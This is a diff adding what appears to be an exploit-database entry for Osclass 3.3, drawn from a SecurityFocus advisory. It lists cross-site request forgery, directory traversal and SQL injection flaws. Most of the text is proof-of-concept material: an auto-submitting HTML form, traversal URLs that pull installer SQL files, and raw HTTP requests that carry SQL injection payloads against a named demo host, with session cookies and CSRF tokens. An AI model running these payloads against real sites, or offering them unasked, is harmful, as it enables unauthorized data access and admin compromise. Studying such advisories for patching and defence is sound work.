@@ -1,0 +1,111 @@
+source: http://www.securityfocus.com/bid/64386/info
+
+Osclass is prone to the following input-validation vulnerabilities:
+
+1. A cross-site request-forgery vulnerability
+2. Multiple directory-traversal vulnerabilities
+3. An SQL-injection vulnerability
+
+Exploiting these issues may allow a remote attacker to perform certain unauthorized actions, to view arbitrary local files and directories within the context of the webserver, compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database. Other attacks may also be possible.
+
+Osclass 3.3 is vulnerable; other versions may also be affected. 
+
+Cross-site request forgery:
+
+
+[!] Exploit Already Tested ... on apache
+
+[^] Error console:- /general/index.php  
+
+[?] proof of concept :
+
+<html>
+<body onload="javascript:document.forms[0].submit()">
+<form  name="<empty>" action="http://www.example.com/general/index.php" 
+method=GET enctype="multipart/form-data">
+<input type=hidden size=30 maxlength=30 name=page value="">
+<input type=hidden size=30 maxlength=30 name=sOrder  value="">
+<input type=hidden size=30 maxlength=30 name=iOrderType value="">
+<td><input type=text size=30 maxlength=250 name=sPattern value=""></td>
+<td><input type=text size=30 maxlength=100 name=sCity value=""></td>
+<td><input type=text size=30 maxlength=100 name=sRegion value=""></td>
+<td><input type=Checkbox size=10 maxlength=10 name=bPic value=""></td>
+<input type=text size=30 maxlength=250 name=sPriceMin value=""></td>
+<td><input type=text size=30 maxlength=100 name=sPriceMax  
+value=""></td>
+<td><input type=Checkbox size=10 maxlength=10 name=sCategory 
+value=""></td>
+<input type=submit class=button value='Save'>
+</form>
+</html>
+
+Directory Traversal: 
+
+
+[!] Exploit Already Tested ... on apache
+
+[^] Error console:- directory traversal allow to dump db 
+
+[?] proof of concept :
+
+
+/general/oc-content/languages/en_US/mail.sql
+
+/general/oc-includes/osclass/installer/basic_data.sql
+
+/general/oc-includes/osclass/installer/pages.sql
+
+
+exploit
+
+http://www.example.com/general/oc-content/languages/en_US/mail.sql
+
+
+SQL injection:
+
+
+[!] Exploit Already Tested ... on apache
+
+[^] Error console:-
+
+1*-URL encoded GET input action was set to -1' or 18 = '16
+
+2*-URL encoded POST input action was set to -1" or 34 = "31
+
+[?] proof of concept :
+
+
+/general/oc-admin/index.php
+/general/index.php
+
+1*-
+
+RequestGET 
+/general/oc-admin/index.php?action=-1%27%20or%2018%20%3d%20%2716&page=login 
+HTTP/1.1
+X-Requested-With: XMLHttpRequest
+Cookie: osclass=1cdd2642f3187eedcfa8b959300d08e2; 
+9abe5=oc_adminId._.oc_adminSecret._.oc_adminLocale%261._.7VIeKmoH._.it_IT
+Host: demo.osclass.org
+Connection: Keep-alive
+Accept-Encoding: gzip,deflate
+User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; 
+Trident/5.0)
+Accept: */*
+
+2*-
+
+POST /general/index.php HTTP/1.1
+Content-Length: 246
+Content-Type: application/x-www-form-urlencoded
+X-Requested-With: XMLHttpRequest
+Cookie: osclass=1cdd2642f3187eedcfa8b959300d08e2
+Host: demo.osclass.org
+Connection: Keep-alive
+Accept-Encoding: gzip,deflate
+User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; 
+Trident/5.0)
+Accept: */*
+
+action=-1%22%20or%2034%20%3d%20%2231&CSRFName=CSRF83497906_1588898183&CSRFToken=dbdd20b65f0a882be3c6629ec1d975be69c2668cdb8e75aa2b5a42f5d031b66cbaf4073567b352024e09fe04ba358c6186d1e58e1493822005a88893363a1f9d&page=login&s_email=sample%40email.tst
+
